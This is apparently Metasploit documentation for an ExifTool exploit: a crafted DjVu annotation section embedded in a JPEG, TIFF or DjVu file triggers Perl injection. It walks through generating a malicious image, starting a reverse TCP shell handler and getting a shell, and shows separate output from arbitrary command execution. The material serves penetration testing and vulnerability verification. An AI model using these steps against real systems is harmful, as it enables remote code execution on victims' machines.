## Vulnerable Application

ExifTool is vulnerable to Perl injection when parsing a crafted DjVu ANT (Annotation) section. Using the
'HasselbladExif' EXIF field, a DjVu file containing the ANT data can be embedded in another file, such as a JPEG or
TIFF file. Upon passing a crafted DjVu file or a "wrapped" DjVu file to ExifTool, arbitrary Perl code can be executed.

Perl backticks are used to execute shell commands.

The vulnerability affects ExifTool 7.44 through 12.23 inclusive.

A copy of the vulnerable software can be obtained at <https://github.com/exiftool/exiftool/releases/tag/12.23>

The `.tar.gz` can simply be unpacked and used as-is:

```plain
% tar -xf 12.23.tar.gz 

% ./exiftool-12.23/exiftool exiftool-12.23/t/images/Writer.jpg
ExifTool Version Number         : 12.23
File Name                       : Writer.jpg
Directory                       : exiftool-12.23/t/images
File Size                       : 251 bytes
File Modification Date/Time     : 2021:04:02 05:24:21+11:00
File Access Date/Time           : 2021:05:04 20:57:46+10:00
File Inode Change Date/Time     : 2021:05:04 20:57:46+10:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Image Width                     : 8
Image Height                    : 8
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 8x8
Megapixels                      : 0.000064
```

## Verification Steps

1. Obtain the vulnerable application
2. Start `msfconsole`
3. Do: `use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection`
4. Set the payload and payload options as appropriate
5. Do: `exploit`
6. Start a handler
7. Transfer the generated `msf.jpg` file to the machine running the vulnerable application
8. On the victim machine, do `exiftool msf.jpg`
9. You should get a shell

## Options

* `TARGET` - you can choose between JPEG (Default), TIFF and DjVu
* `FILENAME` - the name of the image file to produce. Note that it is safe to rename a file after it has been generated.

## Scenarios

### ExifTool 12.23 - Reverse TCP shell

Generate the image file

```plain
msf6 > use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection 
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set LPORT 4444
LPORT => 4444
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > exploit

[+] msf.jpg stored at /home/justin/.msf4/local/msf.jpg
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > 
```

Start a handler

```plain
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
```

As the victim, use ExifTool to analyse the image

```plain
% ~/exiftool-12.23/exiftool /home/justin/.msf4/local/msf.jpg
```

ExifTool will hang and a shell session will be opened

```plain
[*] Command shell session 1 opened (127.0.0.1:4444 -> 127.0.0.1:38606) at 2021-05-04 21:07:37 +1000

id
uid=31337(justin) gid=31337(justin) groups=31337(justin),27(sudo)
```

### ExifTool 12.23 - Arbitrary command execution

Generate the image file

```plain
msf6 > use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection 
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set PAYLOAD cmd/unix/generic 
PAYLOAD => cmd/unix/generic
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > set CMD 'echo "Pwned as $(id)"'
CMD => echo "Pwned as $(id)"
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > exploit

[+] msf.jpg stored at /home/justin/.msf4/local/msf.jpg
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > 
```

As the victim, use ExifTool to analyse the image. The STDOUT of CMD will be reflected in the 'Author' EXIF field.

```plain
% ~/exiftool-12.23/exiftool /home/justin/.msf4/local/msf.jpg | grep Author
Author                          : .Pwned as uid=31337(justin) gid=31337(justin) groups=31337(justin),27(sudo).
```
